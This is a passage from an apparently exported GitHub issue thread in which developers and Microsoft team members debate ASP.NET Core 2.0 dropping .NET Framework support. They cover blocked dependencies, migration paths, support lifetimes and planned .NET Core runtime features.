> Many of the complaints I see in this thread are some variation of ""I can't do X in .NET Core 2.0"" when what the writer actually means is ""I have to change the way I do X in .NET Core 2.0"". Yes, you have to change. No, that's not a bad thing. If you have a small piece of discrete functionality in your ASP.NET MVC application that does something with PDFs or DOCX files, and you really can't find a better way to do whatever that is (have you tried?), then break that functionality out into a microservice running on full .NET on Windows Server and call it as an HTTP API from your .NET Core application. Decomposing applications and moving specific functionality into small, self-contained services isn't even a workaround, it's a general-purpose best practice.

This is just so far off base I don't know where to start. Our pages would be far slower and more expensive in ""micro-services"". We'd eat significantly more time in GC than we do in page renders with such a setup. This also makes the assumption that the full framework dependency is not a critical part of every page render. Bad assumption.

> .NET Core 2.0 isn't even in proper public preview yet, so complaining that it hasn't got support for LDAP or whatever seems premature. If RTM comes around in Q3 and there's still no way of interacting with AD or Kerberos or whatever then complain away (although also think about migrating to modern token-based authentication systems because it's not 2008 anymore).

We've been **told** they won't be there. Watch the stand up. Or look at GitHub where it's labelled ""Future"". We're complaining now because this bad decision will have shipped in Q3.

> There is a smooth migration from ASP.NET MVC 4.5 to ASP.NET Core 2.0. It's called ASP.NET Core 1.0 (and I agree that there should be some promise of long-term support for 1.0 under the circumstances). 

Long-term support doesn't mean it's not a dead end. We can still easily be stranded on 1.x when it goes end of life. In that case, we'd have had longer support on full framework.

> Full .NET catches up and you can run ASP.NET Core 2.x on it

It's targeting `netcoreapp`, that won't happen.

> ...or Whatever third-party tech you depend on supports .NET Core (or can be replaced by equivalent tech that supports .NET Core).

Those libraries are often outside of people's control and time budgets. **Even libraries from Microsoft aren't being upgraded**. I'm fighting the SQL team right now to upgrade their packages to work on the new project system because install.ps1 works. If we can't even get those simple fixes in, we're screwed with `netstandard` ports.

> Remember that—while your team might be hamstrung by external dependencies or internal company policies or politics or just plain inertia—there are hundreds of thousands, if not millions, of developers in the world who are looking to build applications, services and APIs using modern architectural patterns and new technology platforms (cloud/edge/IoT/etc), for whom ASP.NET Core 2.0 is a great fit. They want it to be fast, scalable and cross-platform; those things are important to a lot of people. Asking Microsoft to ignore that rapidly-expanding market, just because your 3rd-party control supplier or an open-source project haven't ported their code yet, is silly.

Calling it silly is belittling, rude, and uncalled for. This is our lives. These are our apps. These are the things we have spent years or decades creating and suddenly before release we find out that the outlook is time capped for us, hard. A lot of uncertainty is introduced to say the least. That's not really something you want in your career."
574	"every point make sense, but remember that in this universe everything will go in the state that requires less energy, then make sure that that state is where you want to go, because we will go there in a way or another. 
So if you want to achieve a certain state, make sure that it requires less energy than the one required to stay where we are now."
575	"I've just read through this entire thread after someone mentioned this as an aside in IRC - I haven't seen any official announcement of this yet - and I'm thoroughly disappointed.

I've been watching .NET Core, getting involved and converting small projects over from .NET Framework to .NET Standard / .NET Core in order to get some experience with the new SDK and runtime, and to run these projects on macOS and Linux.

My big target is a large enterprise web service that uses a heap of components which are not available [yet] in .NET Core 1.0 or 1.1. This includes, just off the top of my head:

* Active Directory (`System.DirectoryServices`), used for authentication and user management
* Entity Framework 6 (`EntityFramework`), since EF Core doesn't support a lot of the functions yet that we use.
* OData (`Microsoft.Data.Services`/`System.Data.Services`) v1-3, the client Javascript library we use doesn't support v4 (yet) and WebAPI OData is a lot more complex to set up.
* IIS Management (`System.Web.Management`) and .NET Remoting (`System.Runtime.Remoting`) for the web service's ability to upgrade itself - though this could be extracted out to a standalone application.
* SignalR
* Custom `IHttpHandler`s and `IHttpModule`s, which would have to be adapted to whatever ASP.NET Core's equivalent is, probably some kind of middleware
* A whole bunch of custom stuff using ASP.NET WebAPI's extensibility.
* I think we might even use `Microsoft.TeamFoundationServer.ExtendedClient` on the server, which only supports net46, has some native assemblies, and has about a 0% chance of working on .NET Core 2.0.
* etc.

Due to the size and complexity of this service, any migration to .NET Core would have to be gradual, and in all likelihood we might have to use some new-in-ASP.NET-Core-2.0 APIs, I don't know yet, we haven't gotten that far.

Removing the ability to run ASP.NET Core on the .NET Framework means that migrations must be done big-bang style if ASP.NET Core 1.x is not a viable stepping stone. We instantly lose the stage of ""run new framework on old runtime"" before ""run new framework on new runtime"". This is a horrific change-management strategy for any large system.

I wouldn't mind so much if .NET Framework support was dropped once .NET Core was at or near parity, but it's still quite far behind for any sufficiently advanced application, and I don't think 2.0 is the right place to make such a breaking change."
576	"@davidfowl 

> I understand this one but I can't believe that you're going to convert all of stack overflow to razor pages only. If you're already using MVC today why not just port to regular views and when more dependencies come online, port to razor pages. The way razor pages is designed makes it trivial to go from a controller action to a razor page.

Many libraries, etc. shared across apps are in play here. Stack Overflow is many applications (the main website is almost entirely a single app, but as a company: we have many related, communicating things.

> Just make sure to escalate that list of dependencies so we know what's important.

Yep, I'm doing that. But that won't be the last dependency, just the biggest blocker since we can't even login to some apps without it. It's a first-screen breaker. I'll try and do the full portability analyzer across our apps this week (after a launch this morning), but I fear it'll just be more depressing. It would help if the analyzer was even updated for current tooling before moves like this were even considered.

Data helps, I'll try and get your more data - unless there's zero chance of this decision changing. If that's the case, please tell us so I don't invest any more of my time in it."
577	"Just for the record: OData is another library that doesn't support netcoreapp yet.

Actually it's even still based on System.Web (you have to use it via OWIN middleware in ASP.NET Core) and they promised support (see https://github.com/OData/WebApi/issues/939).

Still worth mentioning. Especially since it's from Microsoft. 

EDIT: @yaakov-h was 2 min faster, so +1 for his mentioning of OData"
578	"I'm still here replying for a couple of reasons

- I care
- Sleep is for the weak 😆 
- I need to call out the FUD because somebody on the internet is wrong
"
579	"@NickCraver 

> Many libraries, etc. shared across apps are in play here. Stack Overflow is many applications (the main website is almost entirely a single app, but as a company: we have many related, communicating things.

It just means you can't use Razor pages tbh, ASP.NET Core 2.0 has lots of small things but there's not big features or fixes that aren't also being back ported to 1.x. The EOL thing is very real and I personally don't think ASP.NET Core 2.0 supporting .NET Framework for another year would help. We're really discussing a direction change here, either we support .NET Framework forever, or not, there's really no inbetween."
580	"@dustinmoris is not just that. is also a expectations problem. Your use case may be not the same of everyone else.

I am developing aspnetcore 1.* apps and using the .NET desktop as runtime (LOB for enterprise).

And i understand what's the difference between .net core runtime, netstandard, etc (just to be sure this is not a comment about a misunderstanding about that)

My migration was to aspnet core first (targeting .net desktop) because the flow/vision/etc, consolidate it, and AFTER move it to .net core (if possibile), was the decisive scenario in the aspnetcore choice.

This issue is just a bit unexpected, because aspnetcore 1.* was always marketed as ""run on both framework"", with zero warnings afaik about a dropping it next (version or year).
I was expecting an obsolete -> deprecated cycle at least, or just unsupported features (that's ok).

The good part about .net (and aspnet as choice for web stack) is i can leverage existing codebase and libraries.
Some are internal, no real roi to migrate these, when the target (.net core/netstandard) is too fluid.
Some are external, and are difficult to change, if these doesnt work in the netcoreapp2 closure, i cannot use these.

Plus my idea was consolitate to `netstandard2` not `netcoreapp2`.
How can i start to just evaluate the migration of libs to netstandard2, if is not there yet? Is difficult to evaluate migration based on preview bits and promises (and latest years lowered my trust on stability of promises)

I understand is a different scenario than fully greenfield, but also if greenfield i'd like to reuse some libs, because i need to interact with existing system (excel/pdf/etc), not rewrite everything from scracth. 
Or add microservices as rpc just because is latest trend, because make things more complicated (that is a conciuous chooice i want to evaluate and do, not be forced to to wrap existing libs). I need to deliver value (aspnetcore dev flow is nice and productive), not just change architecture.

In my personal evaluation of ecosystem, for my use case, the avaiability of .net core and/or netstandard lib is atm too low (not everyone use just free nuget.org oss pkgs). So if i need to migrate hard to a new stack, i need to evaluate also others stacks (cost/benefit/future/trust/etc)

I am not only writing a TODO web app, i use .NET because i got man years of stuff ready, so i can change one thing (in this case aspnetcore, and leave the rest as is for this iteration).
Just change everything is a recipe for disaster in my scenario, and when i need to do that, i need to really start evaluate if make more sense to migrate to another stack (as java/node) where lib exists.

A smooth migration take time, i like the vision for future aspnet core. but if i dont have a clear path (or doubt about it), is difficult to sell internally.

That said, leave behind .net desktop, can be a good gamble of aspnet team to move faster and pick more new users (or dont lose currents to node/java). 
But for sure, is going to make harder the life for dev on slower ring, and this is aspnet team call (their product). 
My feedback is to not do that, and work hard to support for fw, because as a dev, i need trust and stability, and last years where a bit too fluid in .net ecosystem (not just netcore/project.json, but before also, and marketing/evangelist didnt help lowering the trust)
 
"
581	"@yaakov-h 

If you decide to port to ASP.NET Core (either 1.x or 2.x) you'll need another process. ASP.NET Core does not run on System.Web so you can't do a gradual port in the same project. 

> I wouldn't mind so much if .NET Framework support was dropped once .NET Core was at or near parity, but it's still quite far behind for any sufficiently advanced application, and I don't think 2.0 is the right place to make such a breaking change.
 
There is no right time to drop it. It was never meant to reach parity with .NET Framework and it's quite possible that there are dependencies you have that will never ported. Given that, my question would be, do you redesign the application or do you realistically need to stay on .NET Framework forever?"
582	"@davidfowl that depends entirely on our upstream dependencies. At this point in time, we would be staying on .NET Framework forever.

Interestingly enough most of the 3rd-party ones have `netstandard` releases available already. It's largely the Microsoft dependencies that are keeping us on .NET Framework, and some of those seem to be semi-abandoned (e.g. OData)"
583	"@NickCraver I don't mean to be belittling or insulting. I appreciate that this is a late-in-the-day change, and that's frustrating for whatever section of the community are affected by it, and if I were affected by it, I would probably be kicking up a fuss too. I'm not (where I work we're still on ASP.NET WebAPI 5.2.3), so my take on the situation is less emotional.

Look at it this way: if you were to start from scratch building the next Stack Exchange (whatever that might be) today, wouldn't the stuff that's in `netcoreapp20` that the ASP.NET Core team want to use (like UTF8Strings and Pipelines and low-allocation, asynchronous, _fast_ primitives (I'm guessing a bit there)) make it more attractive to you than full .NET? Wouldn't .NET Core 2.0 generally make more sense than full .NET 4.7.1? If you were picking between web stacks that can evolve and adapt to change quickly, vs web stacks that are irrevocably tied to a slow-moving underlying technology with nearly two decades of legacy code to worry about supporting, which would you choose?"
584	"@ZigMeowNyan 

> I'm more concerned about this move signalling the possible sidelining of .NET Standard than I am about the rest of it. .NET Standard initially seemed like something that would bring the different implementations closer and closer to feature parity while allowing consumers to migrate to the evolving, growing platform. Now it's sounding like nothing more than a milestone of .NET Core features. You won't be able to (or want to) target executables towards .NET Standard - only libraries. And it sounds like there will be significantly less planning involved in .NET Standard, and instead it'll just get rubber-stamped with whatever got used in ASP.NET because it's already too late to change. It'll already be in production, after all.

Those are actually really good points and something worth considering. You have to understand that it has nothing to do with .NET Standard being sidelined, it's just physics. If each .NET platform moves at it's own pace then using the latest .NET Standard means the slower moving frameworks get things less often. That's something that should be internalized by everyone. That doesn't make it less useful, it's just the nature of the beast. The only way to remove this burden is to have a single implementation and a single ship schedule which greatly narrows the places .NET would be able to run.

> Other developers have to sprinkle the code with compiler directives, split code into platform-specific libraries and compile with multiple targets. The rude part of me wants the ASP.NET Core team to dogfood that so you'll be interested in better runtime and tooling support for multi-targeting and multi-platform scenarios. And if your team wants it, then we might get it. The practical part of me says that at a minimum, you should have periodic releases of ASP.NET Core that target the .NET Standard. You need to make actual stable releases anyway. No one's just going to compile the master branch from git and deploy to production. Why not do smaller iterations of the .NET Standard and match them with a tagged ASP.NET release?

We do the same thing, remember, we still target netstandard for a bunch of our libraries and those do contain ifdefs. Others however, target netstandard in order to set us up for taking advantage of new APIs in the 2.x timeframe.

> In short, I support what you're doing and the goals behind it. And I know it's hard when we get on here and complain about decisions that you've made for a very good reason. But a lot of people aren't going to jump on the pioneer train because they can't, and others won't because they don't know where it's going.

Honest question (this is me asking not Microsoft), do you favor compatibility over new features? If yes, why choose ASP.NET Core?
"
585	"Just another quick thought: for every thread like this one, there exists an equivalent-but-opposite thread where a different&mdash;but just as big&mdash;group of people got just as upset because a concession to supporting ""old"" .NET was made."
586	"> Interestingly enough most of the 3rd-party ones have netstandard releases available already. It's largely the Microsoft dependencies that are keeping us on .NET Framework, and some of those seem to be semi-abandoned (e.g. OData)

😞 "
587	"@markrendle
>>•	Many of the complaints I see in this thread are some variation of ""I can't do X in .NET Core 2.0"" when what the writer actually means is ""I have to change the way I do X in .NET Core 2.0"". Yes, you have to change. No, that's not a bad thing. If you have a small piece of discrete functionality in your ASP.NET MVC application that does something with PDFs or DOCX files, and you really can't find a better way to do whatever that is (have you tried?), then break that functionality out into a microservice running on full .NET on Windows Server and call it as an HTTP API from your .NET Core application. Decomposing applications and moving specific functionality into small, self-contained services isn't even a workaround, it's a general-purpose best practice. 
NB As far as I can tell, the OpenXML packages are now supporting .NET Standard, so working with Word/Excel/whatever shouldn't be impossible.<<

As others have already stated, changing the architecture of our nice design is not good plan. In our case we share code between our WPF test of application and the server. The more differences we create between those more complicated it is to maintain.

I can assure you I have spent a lot of time investigating the best tools for us to use for PDF, DocX generation and it's nowhere near as simple as doing with open XML. We use a third-party library because there are tens of thousands of lines of code that they have developed and we don't have to develop/maintain/test. That's the whole point.

.net versioning has become very complicated. I'm not clear if at any point in the future ASP.net will be able to be used on the full .net framework? Because I need to share code between the server and my desktop applications does that mean I can never have the latest version of ASP.Net? This is not an issue in the short term but in the longer term with security improvements et cetera I don't want to be too far away from the latest version.  I'm sure there are many others in my boat where you need some form of compatibility with the full framework.

To clarify what I do is that I have three of my own libraries that are shared between various WPF apps and my server. I would have absolutely no idea at this point which Apis I'm using may or may not be available in.net core. And then in those libraries I use full desktop versions of both Telerik and SyncFusion's WPF tools for generating docx and pdf.  Some or all of the functionality that those tools use may or may not be available in .net core.  Trying to develop applications based on may or may not is extremely difficult. Microsoft has a brilliant base framework in .net, and whilst I understand the reasoning behind .net core. Microsoft seems to have forgotten the importance of backward compatibility.

Stefan"
588	"@markrendle 
> Oh, sorry, I didn't realise your sample size was so big. 257 comments with a strong bias towards people who don't like the decision? Hard to argue with that. DISCLAIMER: I am not an expert on Big Data.

No idea what I did to you, but there's no need for snark or lowlevel whining like this. You know full well this thread is just an example. "
589	"@stefanolson
> .net versioning has become very complicated

I think this is one of the few things we can *all* agree on.

We are looking to port to .Net Core x. 
Our biggest issues are around:
**NewRelic** (no .Net Core plan, so we need to find an alt) 
**NH** (where EF Core doesn't have the features).
**ServiceBase** (sounds like it's coming to .Net Core 2 in summer)

It certainly *sounds* like we'd have to target Core 1.0 in the interim and wait for NH, EF upgrades or get creative."
590	"> It just means you can't use Razor pages tbh, ASP.NET Core 2.0 has lots of small things but there's not big features or fixes that aren't also being back ported to 1.x. The EOL thing is very real and I personally don't think ASP.NET Core 2.0 supporting .NET Framework for another year would help. We're really discussing a direction change here, either we support .NET Framework forever, or not, there's really no inbetween.

It's a little bigger than Razor pages, it means *there's no reason to move*. There just exists no (current) scenario in which *both* of these exist:
1. We'll be supported the whole time
2. There's an actual upgrade on the other side

The fact is that ASP.NET Core isn't really all that useful *without the ecosystem*. Having a controller that renders text back is great, but not useful for that many scenarios. We need the APIs. We need the libraries. We need the ecosystem, *that's why we chose .NET in the first place*.

This change comes goes from a framework that fully supports our use cases today to one that's clearly not ready. It's not even close to ready. And a preview to test if it is ready isn't even generally available. A migration to figure out *the promises of what will be ready* is not available. We're banking on a whole bunch of promises and many will be burned. That's the worst possible way to market these things: over-promising and over-delivering (the overall experience).

I think ASP.NET Core is great. You guys are doing awesome stuff. I was lucky enough to help with some of it. But this switch *at this point in time* is bad. If all of the things we think will be ported are *actually* ported in the 2.x time frame, then great. Make the change in 3.x then. Porting before an alternative is ready and setting a deadline for when to kill the EOL life line is bad. Telling people to port to a maintenance -> EOL version is bad.

Please, don't make this change now. .NET is better than this. Show you care about your users as much as everyone here cares about you. We wouldn't be here if we didn't want to help."
591	"@FransBouma You (should) know full well that Microsoft have vast databases of telemetry, feedback and other data on what people are doing with their tech that give a much clearer picture than any number of GitHub Issues threads, and I don't think my pointing that out was any snarkier than

> Oh I don't know, by reading the posts in this thread?"
592	"> .net versioning has become very complicated. I'm not clear if at any point in the future ASP.net will be able to be used on the full .net framework? Because I need to share code between the server and my desktop applications does that mean I can never have the latest version of ASP.Net? This is not an issue in the short term but in the longer term with security improvements et cetera I don't want to be too far away from the latest version. I'm sure there are many others in my boat where you need some form of compatibility with the full framework.

The code sharing story across different .NET runtimes is .NET Standard. Your libraries should try to target that to code shared across .NET Core and .NET Framework.

> Microsoft seems to have forgotten the importance of backward compatibility.

The problem is, ASP.NET Core was never meant to be backwards compatible... That why there was such a big paradigm shift from ASP.NET 4.x. Seems like if backwards compatibility is the high order bit for you'd be better of using ASP.NET 4.x on .NET Framework. That *is* supported for the forseeable future and will be security patched for as long as Windows is alive.
"
593	Even if it wasn't *meant* to be, though, 1.0 was very backwards compatible! It supported the whole vast legacy of the ecosystem, and we appreciated it. It seemed at the time like nobody had to give away their cake or refrain from eating it.
594	"@NickCraver 

> It's a little bigger than Razor pages, it means there's no reason to move. There just exists no (current) scenario in which both of these exist:

Can you elaborate?

> The fact is that ASP.NET Core isn't really all that useful without the ecosystem. Having a controller that renders text back is great, but not useful for that many scenarios. 

It can do it really fast too 😉 

> I think ASP.NET Core is great. You guys are doing awesome stuff. I was lucky enough to help with some of it. But this switch at this point in time is bad. If all of the things we think will be ported are actually ported in the 2.x time frame, then great. Make the change in 3.x then. Porting before an alternative is ready and setting a deadline for when to kill the EOL life line is bad. Telling people to port to a maintenance -> EOL version is bad.

I don't understand why 2.x (support) and 3.x (drop) is better than 1.x (support) and 2.x (drop). Can you please explain that to me? How does that make *any* difference?"
595	"A couple of //BUILD 2017 session recommendations for those concerned about long-term support of ASP.NET variations:

- T6009 ASP.NET Web Forms updates
  - i.e. they're still developing full .NET web platforms
- T6072 Support for ASP.NET Core: What is an LTS?
  - Which I'd guess is being frantically updated right now :grimacing: "
596	"@davidfowl:

> How does that make any difference?

Because you've promised some of the most significant missing APIs to ship *after* 2.0 does?"
597	"@yaakov-h 

> Because you've promised some of the most significant missing APIs to ship after 2.0 does?

Tell me which ones in ASP.NET Core?"
598	@davidfowl System.DirectoryServices, System.Drawing were mentioned above.
599	"> Honest question (this is me asking not Microsoft), do you favor stability and compatibility over new features? If yes, why choose ASP.NET Core?

I think this is a very good question. If the full .NET framework gives one everything they need today, why so keen on migrating to a complete different stack? If .NET Core and ASP.NET Core would have been named differently, without .NET int the name, then I think much less people would argue about migration issues. Nobody complains that they can't migrate to a faster moving Go or Node.js web stack."
600	"@davidfowl being backward compatible to ASP.NET MVC 5.x is one thing, being backward compatible to .net framework is another thing. Dropping .net framework is a big thing...

> I don't understand why 2.x (support) and 3.x (drop) is better than 1.x (support) and 2.x (drop).

Because 2.x is coming very soon as we understand."
601	"> @davidfowl System.DirectoryServices, System.Drawing were mentioned above.

Those have nothing to do with ASP.NET Core 1.x or 2.x and will run on both when they come online.

Like I said, I'm just here to call out the FUD and thats part of it. This thread has gotten so big that nobody can see the facts in some of the replies."
602	"> @FransBouma You (should) know full well that Microsoft have vast databases of telemetry, feedback and other data on what people are doing with their tech that give a much clearer picture than any number of GitHub Issues threads, and I don't think my pointing that out was any snarkier than

@markrendle telemetry is not magic. You cannot measure why ppl/dev are not switching, or why they switched over other stack, or the importance of their project and how much they like the stack (and help others, with consulting or oss), or what they are doing.

This thread is exactly that, a feedback.


> I don't understand why 2.x (support) and 3.x (drop) is better than 1.x (support) and 2.x (drop). Can you please explain that to me? How does that make any difference?

@davidfowl time. 
time to settle a bit. time to evaluate things. time to change one thing a time. time to use `netstandard2` packages with an rtm thing. time to move our libs to netstandard2 (easier) instead of netstandard1 (harder). Time to change one stuff a time, for me, mostly.
You do aspnet, but my product is not only aspnet, is a combination of lots of libs and tradeoffs and the ecosystem.

"
603	"> Because 2.x is coming very soon as we understand.

What does that have to do with it? What if 2.0 was coming at the end of year or in January? Would it make a difference? What is it in 2.0 that makes 1.x not worthy?"
604	"@yaakov-h They were mentioned [here](https://github.com/aspnet/Home/issues/2022#issuecomment-299536123) where @shanselman said (emphasis mine)

> AD – Totally, this is a gap IF you want to call LDAP directly. You can certainly auth against Windows Auth NOW. We plan to have specifically the DirectoryServices namespace for **Core 2.0 around summer timeframe**
> Drawing – Totally, this is a gap. We plan to have this for **Core 2.0 around summer timeframe**. Until this, these netstandard options also exist ImageSharp, ImageResizer, Mono options, etc"
605	@davidfowl it's not about version, it's about date and maturity of .net core and it's ecosystem.
606	"@hikalkan 

I'm sorry, I understand that from a very high level POV but not from a technical one. Maybe this isn't a technical discussion?"
607	"@enricosada 

> time to settle a bit. time to evaluate things. time to change one thing a time. time to use netstandard2 packages with an rtm thing. time to move our libs to netstandard2 (easier) instead of netstandard1 (harder). Time to change one stuff a time, for me, mostly.
You do aspnet, but my product is not only aspnet, is a combination of lots of libs and tradeoffs and the ecosystem.

Why difference does that make to ASP.NET Core 2.0 specifically? You'll get that benefit from the platform regardless of what ASP.NET Core chooses to do. "
608	@markrendle someone get me a calendar, because seasons span an entire quarter (could be 3 months out from something else in the same quarter) and are especially confusing to us southern-hemisphere people.
609	@enricosada You can get an awful lot of useful information from telemetry and other data sources (web analytics, search data, direct customer feedback). Far more than you can get from angry mobs on GitHub (however justified each individual's anger might be).
610	@yaakov-h Well, the current projected RTM for .NET Core 2.0 (and so ASP.NET Core 2.0) is calendar Q3, which is July/August/September), and Summer in the northern hemisphere is mostly July/August/September, so it's basically the same thing.
611	">You can get an awful lot of useful information from telemetry and other data sources (web analytics, search data, direct customer feedback).

I wonder how reliable this telemetry - at least the automated part -  is for enterprise deployments, though. (Since that's where the majority of the backlash seems to be coming from.)"
612	"> I don't understand why 2.x (support) and 3.x (drop) is better than 1.x (support) and 2.x (drop). Can you please explain that to me? How does that make any difference?

@davidfowl Time. And a proper announcement. If the messaging was clearer, people would't be as surprised."
613	">  @davidfowl Time. And a proper announcement. If the messaging was clearer, people would't be as surprised.

I understand but I don't think it would make a difference in your ability to port anything really. The same EOL policy still exists."
614	"Ok, after having a hard time to understand this issue, i wanted to bring some insights for those that struggles like me and also have some questions.

so if understand correctly, we will eventually have netstandard replacing net framework.

So lets asume netcore doesn't exist and aspnet core is based on netstandard. that means that features will come slower.

Example:
2017 asp.net wants Feature A.
2018 netstandard implement Feature A. we get Feature A on ns.

What the team is saying is to have netcore not based on netstandard so:
2017 asp.net wants Feature A
2017 aspnet team implements Feature A. Asp.Net Core get Feature A on netcore.
2018 netstandard implements Feature A. we get Feature A on ns.

So, this decision actually brings more ""flexibility and speed"" to the equation. Faster release for who can use them, feedback, etc. I think it's a great addition to the slow peace of net framework. Feature will be really mature when it reachs NS.

If having netcore based on netstandard 2 means that features are released 1 year (or any time-frame) later, people will still argue that they want this? This is the scenario we are used to with `NET Framework`.

This is a heaven for aspnet team, be able to ship stuff without being dependent on someone else, and it's also great news for customers who can get those fast stuff. If you can't go with the fast stuff, sticking to the previous version is a reasonable trade-off (and motivation for you/dependencies to upgrade.) 

Library authors should still AIM to target netstandard, and if you can then no worries at all.
If you need something not on netstandard (maybe razor pages(?)) then you must target netcore, on scenario 1, razor pages may well not even exist. I don't see how this can be bad, i would say it's fair.

So the question is, which dependency you have right now that limit yourself from going NET Framework to Net Core ?
I may be the only one here but I never expected aspnet core to work on NET Framework forever, it was obvious to me that this was a ""transition"" step. All my development that currently need NET Framework is `splited`. (and no, this isn't microservices, it's much simpler than that).

the 2.x support and 3.x drop is not different than 1.x support and 2.x drop. I'll take a guess here and say that people is not understanding the scenario clearly, so I hope this clarify at least some.

@NickCraver you said you want microsoft to revert this decision. What would be your suggestion, to do not have an isolated netcore and have slower feature releases? (honest question)

@davidfowl I think there may be a subtle hidden issue with the current proposal that worries developers. 
If you have feature A for asp.net (with netcore) then you can market and ship (and tick a management/pm checkbox) and be ""lazy"" to implement on netstandard, if I'm not mistaken this is what ""betting"" on uncertain is refereed here.
So in my previous example, netstandard implements Feature A may be in 2019, or 2020, or never instead of 2018. <-- this looks like a possible problem (?) am I right ? Can Microsoft commit to something here?

"
615	"Whilst we can all differ on whether we like the announcement thanks indeed to @davidfowl @DamianEdwards and @shanselman for spending the time to discuss. It's further proof of increased engagement and openness. 

I'm sure some will argue on timing etc, but it's progress."
616	"> Example:
> 2017 asp.net wants Feature A.
> 2018 netstandard implement Feature A. we get Feature A on ns.
> 
> What the team is saying is to have netcore not based on netstandard so:
> 2017 asp.net wants Feature A
> 2017 aspnet team implements Feature A. Asp.Net Core get Feature A on netcore.
> 2018 netstandard implements Feature A. we get Feature A on ns.

what they should have done is:
2017 aspnet team builds feature needed in lib X, which supports netstandard2.0. This way aspnet works on everything .netstandard runs on, and users can then run it on .net full as lib X is usable on .NET full too (it's just a nuget install away). 

Instead, they don't do this, they force lib X to be .NET core only (otherwise, why this thread/decision in the first place). If lib X is so superadvanced that it needs CoreCLR features, Microsoft has to ask themselves why these advanced features aren't ported to the .NET full CLR. 

All in all it feels like politics where MS needs a fast moving .NET core/aspnet core to provide Azure customers a stack which can be used in containers on azure so it competes with JVM/NodeJS based containers on AWS or Google cloud. From their business perspective I can even understand that. But what it shows is that MS has no priority concerning .NET full to move forward faster, as it doesn't put enough resources on .NET full to keep up with .NET core. Look at the amount of APIs added to .NET full in the past 2 years. Does that tell you a large team is working on that? 

No.

Microsoft sells a large database system, SQL Server Enterprise. It comes with fancy encryption features. Not supported on .NET core. Have fun selling .NET core 2.0 to the enterprises who are the potential customers of that expensive database system.

You may want to move 'fast', but unless you fully understand the destination you're moving towards, it helps taking a minute or two to decide that first. "
617	"The more I think about it the more I think the issue most people have is that they feel we are cutting the cord between .net and asp.net.
Currently we have asp.net, asp.net core (.net), and asp.net core (core). So you could choose if you wanted to go no, little or full core.

Since the versioning is poorly communicated people feel that it's only the last part that is innovating and moving on, while asp.net and asp.net core (.net) is stuck.
Since we have no way to validate if a lib will work in netstandard2.0 without trying, it gets very risky to go with full core on a new project. So they end up with either asp.net (old) or asp.net core (also old).
And since both are old, it makes sense to just go with system.web and old asp.net. Since they know that and since asp.net core is EOL anyway, why bother.

So we end up with only the brave choosing core, and the rest go with old but stable system.web. And we will forever be stuck with a even more fractured ecosystem.

PS: I'm wording this as with the current feeling. That asp.net core 1.x is ""old and outdated"" vs 2.x. Not that it's a fact, but that's what people are thinking."
618	"@davidfowl

> If each .NET platform moves at it's own pace then using the latest .NET Standard means the slower moving frameworks get things less often.

This already happens, and we're okay with it. The [Versions](https://github.com/dotnet/standard/blob/master/docs/versions.md) document is commonly filled with _vNext_. And that's fine. Rather than waiting until all platforms are at parity before incrementing the standard, I'd rather see the standard defined a few versions ahead and watch the platforms catch up. People can even pitch in for the definition and implementation. And if ASP.NET Core targeted the standard for its releases, the moment a platform and architecture implemented that new standard, the package would be available. New Standard versions could come in through VS updates or packages.

The way it's being presented, though .NET Standard doesn't sound like it's a community planned effort. It's more like a snapshot of the implemented contracts that passed review. And if major projects aren't targeting it, there won't be nearly as much planning towards its releases.

> We do the same thing

Oh good. Shared misery is best misery. Csproj and sln files with the platform/config stuff are really annoying, btw, because the build combinations aren't always declared - they're inferred. So VS might think I have more build combinations than actually exist because it assumes that every possible combination is important. And I have to have extra sections in the file that wouldn't be needed if i could just declare the platform/config combinations. Like how you can use functions like `Substring` in the csproj `PropertyGroup` elements to simplify custom properties, but those conditions are used in determine build configurations, so you have to have the full string values in there. This kind of stuff shouldn't be as much of a hassle as it is.

> Honest question (this is me asking not Microsoft), do you favor compatibility over new features? If yes, why choose ASP.NET Core?

Personally, no. As long as there's a way to do what I need to do, I don't mind rewriting the code as long as it's not a huge endeavor with little benefit or a PITA to test. So I'd pick whatever's got the most momentum and potential. But I have to work with projects across multiple technologies - Win32, COM, CORBA, ADO.NET, several reporting engines, various web APIs, embedded browsers like CEF/Firefox/IE (no edge, of course, since it's not supported) and multiple vendor-specific things I'll avoid shaming. I implement what I can as a plugin, but I'm married to the least common denominator on the host executable, for the most part. Dealing with that many technologies is annoying, but they're static. That's how a lot of desktop/server stuff is. As long as I'm given the tools to interop, I can make do. But the less deprecated frameworks I remember, the better.

ASP.NET, though, is part of the web stack, and the web stack is something that I feel needs to stay up to date. It has a different use case, and there's an unfortunate expectation to use the newer platform for web work unless there's a good reason not to, or a significant incompatible code base. I try to keep that updated because web standards change quickly and significantly. Most of the people keeping pace with the web are sticking with newer technology, and implementing the new stuff on older stacks can be rather painful. Especially in the situation where ASP.NET competes with PHP and Node, I've got to keep a more modern stack to draw talent and interest. I'd love to do less web work, but unfortunately it's the new UI expectation. I was hoping that sticking to the standard would let me have the best of both worlds, but that seems like a limited time offer."
619	"> so if understand correctly, we will eventually have netstandard replacing net framework.

Not thats not correct. I'm not sure how you drew that conclusion. .NET Standard will always be a subset of each of the runtimes that support it.

I want to throw some crazy stuff out here because it's been mentioned a few times. What I'm about to say has no bearing on what will happen, it's all speculation at this point. Several people asked why we want to target .NET Core instead of .NET Standard.

- We've identified strings as one of the major things we'd like to try tackling in .NET Core, there's tons of ideas but one of them is to have string be utf8 by default (tons of compat problems but follow me here).
- Another thing we'd like to fix is the ability to take cheap slices of arrays/strings, any piece of contiguous memory. We've added `Span<T>` and are looking at `Buffer<T>` to represent this. It might mean that String and Array implement new interfaces that make it possible to take a slice that requires 0 allocation.
- This leads to new methods on String that allow splitting that doesn't allocate an array every time.
- This leads to overloads to Int, UInt etc (TryParse) that take `Span<char>` and `Span<byte>`.
- This leads to new encoding routines that take `Span<byte>`.
- `Buffer<T>` and `Span<T>` let you represent memory in a uniform way and we want to upgrade the networking stack to allow passing pre-pinned buffers that take `Span<T>` or `Buffer<T>`.
- Kestrel will implement HTTP2 in the 2.x timeframe (currently aiming at 2.1) and that requires new APIs on SSL stream to do ALPN (https://en.wikipedia.org/wiki/Application-Layer_Protocol_Negotiation).
- Http Client on .NET Core supports duplex streaming, it'll make it possible to implement streaming end points over http in signalr over a single, non websocket http request.
- We forked the header parser implementations from HttpClient and System.Net.Http and renamed them (https://github.com/aspnet/HttpAbstractions/tree/d1d9bceff56cb44a194ae36923ce687e5e353006/src/Microsoft.Net.Http.Headers) so that we could improve them and have them support both .NET Framework and .NET Core. .NET Core has a copy of these improvements haven't made it back because there no need to improve them (we couldn't consume them).
